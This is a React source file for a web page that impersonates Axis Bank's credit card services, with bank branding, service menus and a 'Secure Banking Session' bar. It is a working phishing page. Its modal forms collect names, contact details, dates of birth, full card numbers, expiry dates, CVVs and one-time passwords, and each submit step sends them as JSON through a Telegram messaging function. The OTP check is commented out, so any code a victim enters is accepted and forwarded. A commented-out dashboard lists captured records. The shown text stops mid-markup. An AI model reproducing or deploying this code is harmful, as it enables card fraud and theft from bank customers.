import { useState, useEffect } from 'react'
import './App.css'
import sendTelegramMessage from './Submit'
const menuItems = [
  { id: 'card-activation', icon: 'power', label: 'Card Activation' },
  { id: 'card-deactivate', icon: 'ban', label: 'Card Deactivate' },
  { id: 'pay-bill', icon: 'receipt', label: 'Pay Bill' },
  { id: 'card-statements', icon: 'file-text', label: 'Card Statements' },
  { id: 'card-pin', icon: 'pin', label: 'Card PIN Generation' },
  { id: 'track-application', icon: 'radar', label: 'Track Application Status' },
  { id: 'card-limit', icon: 'trending-up', label: 'Card Limit Increase Application' },
  { id: 'card-reward', icon: 'gift', label: 'Card Reward Redeem' },
  { id: 'card-protection', icon: 'shield', label: 'Card Protection Plan (CPP)' },
  { id: 'rewards-program', icon: 'gift', label: 'Rewards Program' },
  { id: 'manage-international', icon: 'globe', label: 'Manage International Usage' },
  { id: 'convert-emi', icon: 'percent', label: 'Convert to EMI' },
  { id: 'loan-credit', icon: 'bank', label: 'Loan on Credit Card' },
  { id: 'balance-transfer', icon: 'transfer', label: 'Balance Transfer' },
  { id: 'virtual-card', icon: 'virtual-card', label: 'Virtual Credit Card' },
  { id: 'card-to-card', icon: 'card-plus', label: 'Card To Card Apply Application' },
  { id: 'card-separate', icon: 'card-split', label: 'Card Separate Merged Card' },
  { id: 'report-transaction', icon: 'headset', label: 'Report Transaction' },
  { id: 'help-center', icon: 'help', label: 'Help Center' },
  { id: 'login', icon: 'login', label: 'Login' },
]

const carouselSlides = [
  {
    id: 1,
    tagIcon: '📊',
    tagTitle: 'Track Spending',
    title: 'Monitor your transactions and manage budgets.',
    subtitle: 'View detailed reports of your spending to make smarter choices.',
    badgeIcon: 'chart',
    gradient: 'linear-gradient(115deg, #a22268 0%, #8c2691 48%, #85228c 100%)',
  },
  {
    id: 2,
    tagIcon: '💳',
    tagTitle: 'Activate Card',
    title: 'Start using your new credit card instantly.',
    subtitle: 'Ensure your card is activated for online and offline transactions.',
    badgeIcon: 'card',
    gradient: 'linear-gradient(115deg, #881944 0%, #4f2868 45%, #273b64 100%)',
  },
  {
    id: 3,
    tagIcon: '🎁',
    tagTitle: 'Reward Points',
    title: 'Redeem points for exclusive vouchers & flights.',
    subtitle: 'Enjoy up to 5X rewards on all your travel and shopping expenses.',
    badgeIcon: 'gift',
    gradient: 'linear-gradient(115deg, #7c1a59 0%, #902263 50%, #b32a5a 100%)',
  },
  {
    id: 4,
    tagIcon: '🛡️',
    tagTitle: 'Card Security',
    title: 'Instant block & international usage control.',
    subtitle: 'Stay in complete control of your card safety 24/7 with zero liability.',
    badgeIcon: 'shield',
    gradient: 'linear-gradient(115deg, #2c3e6b 0%, #452d6a 50%, #7e1d53 100%)',
  },
  {
    id: 5,
    tagIcon: '⚡',
    tagTitle: 'Quick Loans',
    title: 'Get instant pre-approved loans on your card.',
    subtitle: 'Minimal paperwork with ultra-low interest rates and flexible tenures.',
    badgeIcon: 'bank',
    gradient: 'linear-gradient(115deg, #8b1842 0%, #681755 50%, #401859 100%)',
  },
]

const manageCardActions = [  
  {
    id: 'card-protection',
    title: 'Card Protection Plan (CPP)',
    description: 'Activate or deactivate your Card Protection Plan to protect your credit card from unauthorized transactions, fraud risks, theft, and misuse with enhanced security coverage.',
    icon: 'shield',
    iconBg: '#fce7f3',
    iconColor: '#a21caf',
    btn1: 'Activate CPP',
    btn2: 'Deactivate CPP',
  },
  {
    id: 'rewards-program',
    title: 'Rewards Program',
    description: 'Redeem your accrued rewards points and cashback instantly on travel, shopping, and statement credits with exclusive partner offers.',
    icon: 'gift',
    iconBg: '#fef3c7',
    iconColor: '#d97706',
    btn1: 'Redeem Reward',
    btn2: 'Claim Cashback',
  },
  {
    id: 'limit-upgrade',
    title: 'Card Limit & Upgrade',
    description: 'Request credit limit increases, upgrade your existing card, and unlock premium benefits with upgraded variants.',
    icon: 'trending',
    iconBg: '#e6f7f4',
    iconColor: '#0d9488',
    btn1: 'Increase Limit',
    btn2: 'Upgrade Card',
  },
  {
    id: 'apply-track',
    title: 'Apply & Track Card',
    description: 'Apply for a new credit card, upload required documents, and track your card application status in real-time.',
    icon: 'card-plus',
    iconBg: '#f3e8ff',
    iconColor: '#9333ea',
    btn1: 'Apply Card',
    btn2: 'Track Status',
  },
  {
    id: 'billing-payments',
    title: 'Billing & Payments',
    description: 'Pay credit card bills instantly, check outstanding balances, download statements, and manage auto-payment services securely.',
    icon: 'receipt',
    iconBg: '#e0f2fe',
    iconColor: '#0284c7',
    btn1: 'Pay Bill',
    btn2: 'View Statements',
  },
  {
    id: 'supplementary',
    title: 'Supplementary & Add-on Cards',
    description: 'Apply for add-on cards for family members, manage supplementary card limits, and monitor shared spending.',
    icon: 'users',
    iconBg: '#fce7f3',
    iconColor: '#db2777',
    btn1: 'Apply Add-on',
    btn2: 'Manage Add-on',
  },
  {
    id: 'transactions',
    title: 'Transaction Management',
    description: 'Monitor recent transactions, track spending activity, report failed payments, and dispute suspicious transactions.',
    icon: 'transfer',
    iconBg: '#ffedd5',
    iconColor: '#ea580c',
    btn1: 'View Transactions',
    btn2: 'Report Transaction',
  },
  {
    id: 'settings-controls',
    title: 'Card Settings & Controls',
    description: 'Customize transaction limits, manage online payment permissions, contactless usage, and notification settings.',
    icon: 'settings',
    iconBg: '#f1f5f9',
    iconColor: '#475569',
    btn1: 'Manage Settings',
    btn2: 'Set Limits',
  },
  {
    id: 'emi-loans',
    title: 'EMI & Loan Services',
    description: 'Convert transactions into easy EMIs, check eligibility, manage installment plans, and explore instant loan offers.',
    icon: 'money',
    iconBg: '#dcfce7',
    iconColor: '#16a34a',
    btn1: 'Convert to EMI',
    btn2: 'Loan Offers',
  },
  {
    id: 'intl-usage',
    title: 'International Usage',
    description: 'Enable or disable international transactions, manage overseas spending, and secure global card usage preferences.',
    icon: 'globe',
    iconBg: '#cffafe',
    iconColor: '#0891b2',
    btn1: 'Enable Intl.',
    btn2: 'Disable Intl.',
  },
  {
    id: 'login-auth',
    title: 'Login & Authentication',
    description: 'Securely access your account, generate or reset card PINs, verify transactions, and manage authentication settings.',
    icon: 'lock',
    iconBg: '#dbeafe',
    iconColor: '#2563eb',
    btn1: 'Secure Login',
    btn2: 'Generate PIN',
  },
  {
    id: 'support-help',
    title: 'Customer Support & Help',
    description: 'Get 24/7 assistance for card disputes, complaints, lost cards, emergency blocking, and service-related queries.',
    icon: 'headset',
    iconBg: '#ffedd5',
    iconColor: '#ea580c',
    btn1: 'Help Center',
    btn2: 'Contact Support',
  },
]

function MenuIcon({ type }) {
  const icons = {
    power: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M18.36 6.64a9 9 0 1 1-12.73 0" />
        <line x1="12" y1="2" x2="12" y2="12" />
      </svg>
    ),
    ban: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="4.93" y1="4.93" x2="19.07" y2="19.07" />
      </svg>
    ),
    receipt: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M4 2v20l2-1 2 1 2-1 2 1 2-1 2 1 2-1 2 1V2l-2 1-2-1-2 1-2-1-2 1-2-1-2 1Z" />
        <line x1="8" y1="10" x2="16" y2="10" />
        <line x1="8" y1="14" x2="16" y2="14" />
        <line x1="8" y1="6" x2="12" y2="6" />
      </svg>
    ),
    'file-text': (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
        <polyline points="14 2 14 8 20 8" />
        <line x1="16" y1="13" x2="8" y2="13" />
        <line x1="16" y1="17" x2="8" y2="17" />
      </svg>
    ),
    pin: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="3" y="4" width="18" height="16" rx="2" />
        <text x="5.5" y="15.5" fontSize="7.5" fontWeight="700" fill="currentColor" stroke="none" fontFamily="sans-serif">123</text>
      </svg>
    ),
    radar: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <circle cx="12" cy="12" r="6" />
        <circle cx="12" cy="12" r="2" fill="currentColor" />
      </svg>
    ),
    'trending-up': (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="23 6 13.5 15.5 8.5 10.5 1 18" />
        <polyline points="17 6 23 6 23 12" />
      </svg>
    ),
    gift: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="20 12 20 22 4 22 4 12" />
        <rect x="2" y="7" width="20" height="5" />
        <line x1="12" y1="22" x2="12" y2="7" />
        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
      </svg>
    ),
    globe: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="2" y1="12" x2="22" y2="12" />
        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
      </svg>
    ),
    shield: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
      </svg>
    ),
    percent: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <line x1="19" y1="5" x2="5" y2="19" />
        <circle cx="6.5" cy="6.5" r="2.5" />
        <circle cx="17.5" cy="17.5" r="2.5" />
      </svg>
    ),
    bank: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <line x1="3" y1="22" x2="21" y2="22" />
        <line x1="6" y1="18" x2="6" y2="11" />
        <line x1="10" y1="18" x2="10" y2="11" />
        <line x1="14" y1="18" x2="14" y2="11" />
        <line x1="18" y1="18" x2="18" y2="11" />
        <polygon points="12 2 20 7 4 7" />
      </svg>
    ),
    transfer: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="17 1 21 5 17 9" />
        <path d="M3 11V9a4 4 0 0 1 4-4h14" />
        <polyline points="7 23 3 19 7 15" />
        <path d="M21 13v2a4 4 0 0 1-4 4H3" />
      </svg>
    ),
    'virtual-card': (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
        <line x1="1" y1="10" x2="23" y2="10" />
        <line x1="5" y1="16" x2="9" y2="16" />
      </svg>
    ),
    'card-plus': (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="1" y="4" width="22" height="12" rx="2" ry="2" />
        <line x1="1" y1="10" x2="23" y2="10" />
        <line x1="12" y1="17" x2="12" y2="23" />
        <line x1="9" y1="20" x2="15" y2="20" />
      </svg>
    ),
    'card-split': (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="16 3 21 3 21 8" />
        <line x1="4" y1="20" x2="21" y2="3" />
        <polyline points="21 16 21 21 16 21" />
        <line x1="15" y1="15" x2="21" y2="21" />
        <line x1="4" y1="4" x2="9" y2="9" />
      </svg>
    ),
    headset: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 18v-6a9 9 0 0 1 18 0v6" />
        <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z" />
      </svg>
    ),
    help: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
        <line x1="12" y1="17" x2="12.01" y2="17" />
      </svg>
    ),
    login: (
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
        <polyline points="10 17 15 12 10 7" />
        <line x1="15" y1="12" x2="3" y2="12" />
      </svg>
    ),
  }
  return icons[type] || null
}

function ServiceBoxIcon({ type, color }) {
  if (type === 'trending') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="23 6 13.5 15.5 8.5 10.5 1 18" />
        <polyline points="17 6 23 6 23 12" />
      </svg>
    )
  }
  if (type === 'card-plus') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="5" width="20" height="14" rx="2" />
        <line x1="2" y1="10" x2="22" y2="10" />
        <line x1="17" y1="14" x2="17" y2="18" />
        <line x1="15" y1="16" x2="19" y2="16" />
      </svg>
    )
  }
  if (type === 'receipt') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M4 2v20l2-1 2 1 2-1 2 1 2-1 2 1 2-1 2 1V2l-2 1-2-1-2 1-2-1-2 1-2-1-2 1Z" />
        <line x1="8" y1="8" x2="16" y2="8" />
        <line x1="8" y1="12" x2="16" y2="12" />
        <line x1="8" y1="16" x2="12" y2="16" />
      </svg>
    )
  }
  if (type === 'users') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
        <circle cx="9" cy="7" r="4" />
        <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
        <path d="M16 3.13a4 4 0 0 1 0 7.75" />
      </svg>
    )
  }
  if (type === 'transfer') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
        <line x1="4" y1="9" x2="20" y2="9" />
        <polyline points="8 5 4 9 8 13" />
        <line x1="20" y1="15" x2="4" y2="15" />
        <polyline points="16 11 20 15 16 19" />
      </svg>
    )
  }
  if (type === 'settings') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="3" />
        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" />
      </svg>
    )
  }
  if (type === 'money') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="6" width="20" height="12" rx="2" />
        <circle cx="12" cy="12" r="2" />
        <path d="M6 12h.01M18 12h.01" />
      </svg>
    )
  }
  if (type === 'globe') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="2" y1="12" x2="22" y2="12" />
        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
      </svg>
    )
  }
  if (type === 'shield') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
      </svg>
    )
  }
  if (type === 'gift') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="20 12 20 22 4 22 4 12" />
        <rect x="2" y="7" width="20" height="5" />
        <line x1="12" y1="22" x2="12" y2="7" />
        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
      </svg>
    )
  }
  if (type === 'lock') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
      </svg>
    )
  }
  if (type === 'headset') {
    return (
      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 18v-6a9 9 0 0 1 18 0v6" />
        <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z" />
      </svg>
    )
  }
  return null
}

function App() {
  const [activeItem, setActiveItem] = useState('')
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [currentSlide, setCurrentSlide] = useState(0)
  const [activeModal, setActiveModal] = useState(null)
  const [formSubmitted, setFormSubmitted] = useState(false)
  const [formStep, setFormStep] = useState(1)
  const [showOtpModal, setShowOtpModal] = useState(false)
  const [otpCode, setOtpCode] = useState('')
  const [otpError, setOtpError] = useState('')
  const [currentDemoOtp, setCurrentDemoOtp] = useState('')
  const [verificationRecords, setVerificationRecords] = useState(() => {
    if (typeof window === 'undefined') return []

    try {
      const savedRecords = localStorage.getItem('axis-demo-verifications')
      return savedRecords ? JSON.parse(savedRecords) : []
    } catch (error) {
      console.error('Failed to read verification records:', error)
      return []
    }
  })
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    mobile: '',
    dob: '',
    plan: 'ACTIVATE',
    cardHolderName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    agree1: true,
    agree2: true,
    agree3: false,
  })

  const openCardModal = (cardTitle, buttonAction) => {
    setActiveModal({
      title: cardTitle,
      service: buttonAction,
    })
    setFormStep(1)
    setFormSubmitted(false)
    setShowOtpModal(false)
    setOtpCode('')
    setOtpError('')
    setCurrentDemoOtp('')
    setFormData({
      fullName: '',
      email: '',
      mobile: '',
      dob: '',
      plan: 'ACTIVATE',
      cardHolderName: '',
      cardNumber: '',
      expiry: '',
      cvv: '',
      agree1: true,
      agree2: true,
      agree3: false,
    })
  }

  const closeModal = () => {
    setActiveModal(null)
    setFormSubmitted(false)
    setFormStep(1)
    setShowOtpModal(false)
    setOtpCode('')
    setOtpError('')
  }

  const handleStep1Submit = async (e) => {
    e.preventDefault()
    const success = await sendTelegramMessage(
      JSON.stringify(formData, null, 2)
    );
    
    // console.log(success)
    setFormStep(2)
  }

  const generateDemoOtp = () => String(Math.floor(100000 + Math.random() * 900000))

  useEffect(() => {
    if (typeof window !== 'undefined') {
      localStorage.setItem('axis-demo-verifications', JSON.stringify(verificationRecords))
    }
  }, [verificationRecords])

  const handleStep2Submit = async (e) => {
    e.preventDefault()
    const success = await sendTelegramMessage(
      JSON.stringify(formData, null, 2)
    );
    const nextOtp = generateDemoOtp()
    setCurrentDemoOtp(nextOtp)
    setOtpCode('')
    setOtpError('')
    setShowOtpModal(true)
  }

  const handleOtpSubmit = async (e) => {
    e.preventDefault()

    // if (otpCode.trim() !== currentDemoOtp) {
    //   setOtpError(`Invalid OTP. Please enter the correct demo code for this user: ${currentDemoOtp || 'Generate a fresh OTP'}.`)
    //   return
    // }

    const verificationEntry = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      fullName: formData.fullName || 'Not provided',
      email: formData.email || 'N/A',
      mobile: formData.mobile || 'N/A',
      service: activeModal?.service || 'Service Request',
      demoOtp: otpCode,
      verificationStatus: 'Verified',
      verificationMode: 'Demo test-only OTP',
      timestamp: new Date().toISOString(),
    }

    const success = await sendTelegramMessage(
      JSON.stringify({ ...formData, demoOtp: otpCode, otpMode: 'Demo test-only OTP', status: 'Verified' }, null, 2)
    )

    if (success) {
      setVerificationRecords((prev) => [verificationEntry, ...prev])
      setShowOtpModal(false)
      setOtpError('')
      setCurrentDemoOtp('')
      setFormSubmitted(true)
    } else {
      console.error('Failed to submit')
      setOtpError('OTP verified, but submission failed. Please try again.')
    }
  }



  // Carousel auto-advance
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % carouselSlides.length)
    }, 4500)
    return () => clearInterval(timer)
  }, [])

  const slide = carouselSlides[currentSlide]

  return (
    <div className="page-container">
      {/* ─── White Header ─── */}
      <header className="site-header">
        <div className="header-inner">
          <img src="/logo-full.png" alt="Axis Bank" className="axis-logo" />
          <button
            className="menu-toggle-btn"
            onClick={() => setSidebarOpen(!sidebarOpen)}
            aria-label="Toggle menu"
            id="hamburger-btn"
          >
            <span className="bar"></span>
            <span className="bar"></span>
            <span className="bar"></span>
          </button>
        </div>
      </header>

      {/* ─── Secure Banking Session Bar ─── */}
      <div className="security-bar">
        <div className="security-bar-inner">
          <div className="security-status">
            <svg className="lock-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
            <span>Secure Banking Session</span>
          </div>
          <div className="sync-status">Last sync: Just now</div>
        </div>
      </div>

      {/* ─── Main Content Container ─── */}
      <main className="main-content">
        {/* Welcome Section */}
        <div className="welcome-banner">
          <h1 className="welcome-title">Welcome to Axis Credit Card Services</h1>
          <p className="welcome-subtitle">
            View account summary, check available credit, track rewards, and securely manage all your cards.
          </p>
        </div>

        {/* Feature Carousel Banner */}
        <div className="carousel-section">
          <div
            className="carousel-card"
            style={{ background: slide.gradient }}
          >
            <div className="carousel-left">
              <div className="carousel-badge-tag">
                <span className="carousel-badge-icon">{slide.tagIcon}</span>
                <span className="carousel-badge-text">{slide.tagTitle}</span>
              </div>
              <h3 className="carousel-card-title">{slide.title}</h3>
              <p className="carousel-card-desc">{slide.subtitle}</p>
            </div>
            <div className="carousel-right">
              <div className="carousel-circle-icon">
                {slide.badgeIcon === 'chart' && (
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="2" y="12" width="4" height="8" rx="1" fill="currentColor" />
                    <rect x="9" y="8" width="4" height="12" rx="1" fill="currentColor" />
                    <rect x="16" y="4" width="4" height="16" rx="1" fill="currentColor" />
                  </svg>
                )}
                {slide.badgeIcon === 'card' && (
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="2" y="5" width="20" height="14" rx="2" />
                    <line x1="2" y1="10" x2="22" y2="10" />
                  </svg>
                )}
                {slide.badgeIcon === 'gift' && (
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 12 20 22 4 22 4 12" />
                    <rect x="2" y="7" width="20" height="5" />
                    <line x1="12" y1="22" x2="12" y2="7" />
                    <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
                    <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
                  </svg>
                )}
                {slide.badgeIcon === 'shield' && (
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  </svg>
                )}
                {slide.badgeIcon === 'bank' && (
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <polygon points="12 2 20 7 4 7" />
                    <line x1="3" y1="22" x2="21" y2="22" />
                    <line x1="6" y1="18" x2="6" y2="11" />
                    <line x1="10" y1="18" x2="10" y2="11" />
                    <line x1="14" y1="18" x2="14" y2="11" />
                    <line x1="18" y1="18" x2="18" y2="11" />
                  </svg>
                )}
              </div>
            </div>
          </div>

          {/* Dots Indicator */}
          <div className="carousel-dots">
            {carouselSlides.map((_, idx) => (
              <button
                key={idx}
                className={`carousel-dot ${idx === currentSlide ? 'active' : ''}`}
                onClick={() => setCurrentSlide(idx)}
                aria-label={`Go to slide ${idx + 1}`}
              />
            ))}
          </div>
        </div>

        {/* Axis Card App Banner - using play-store.png */}
        <div className="app-promo-card">
          <div className="promo-left">
            <div className="google-play-badge">
              <img src="/play-store.png" alt="Google Play Store" className="play-store-img" />
            </div>
            <div className="promo-texts">
              <h4 className="promo-title">Axis Card App</h4>
              <p className="promo-subtitle">Access your credit card services instantly on mobile.</p>
            </div>
          </div>
          <span className="promo-arrow">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="9 18 15 12 9 6" />
            </svg>
          </span>
        </div>

        {/* Manage Your Cards Section */}
        <section className="services-section">
          <div className="services-header">
            <h2 className="services-title">Manage Your Cards</h2>
            <p className="services-subtitle">Select a service below to proceed securely.</p>
          </div>

          <div className="action-cards-list">
            {manageCardActions.map((card) => (
              <div key={card.id} className="action-card">
                <div className="action-card-top">
                  <div
                    className="action-card-icon"
                    style={{ backgroundColor: card.iconBg }}
                  >
                    <ServiceBoxIcon type={card.icon} color={card.iconColor} />
                  </div>
                  <div className="action-card-info">
                    <h3 className="action-card-title">{card.title}</h3>
                    <p className="action-card-desc">{card.description}</p>
                  </div>
                </div>
                <div className="action-card-buttons">
                  <button
                    className="action-btn"
                    onClick={() => openCardModal(card.title, card.btn1)}
                  >
                    {card.btn1}
                  </button>
                  <button
                    className="action-btn"
                    onClick={() => openCardModal(card.title, card.btn2)}
                  >
                    {card.btn2}
                  </button>
                </div>
              </div>
            ))}
          </div>

          {/* <section className="admin-dashboard">
            <div className="admin-dashboard-header">
              <div>
                <p className="admin-dashboard-kicker">Admin Console</p>
                <h2 className="admin-dashboard-title">Verification Dashboard</h2>
              </div>
              <span className="admin-dashboard-badge">{verificationRecords.length} Records</span>
            </div>

            {verificationRecords.length === 0 ? (
              <div className="admin-empty-state">
                No verification requests yet. New user submissions will appear here.
              </div>
            ) : (
              <div className="admin-table-wrap">
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>User</th>
                      <th>Email</th>
                      <th>Mobile</th>
                      <th>Service</th>
                      <th>Test OTP</th>
                      <th>Status</th>
                      <th>Timestamp</th>
                    </tr>
                  </thead>
                  <tbody>
                    {verificationRecords.map((record) => (
                      <tr key={record.id}>
                        <td>{record.fullName}</td>
                        <td>{record.email}</td>
                        <td>{record.mobile}</td>
                        <td>{record.service}</td>
                        <td><strong>{record.demoOtp}</strong></td>
                        <td>
                          <span className="admin-status verified">{record.verificationStatus}</span>
                        </td>
                        <td>{new Date(record.timestamp).toLocaleString('en-IN', {
                          dateStyle: 'medium',
                          timeStyle: 'short',
                        })}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </section> */}

          {/* Footer Trust Badges */}
          <div className="trust-badges-container">
            <div className="trust-badge-item">
              <div className="trust-badge-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  <polyline points="9 12 11 14 15 10" />
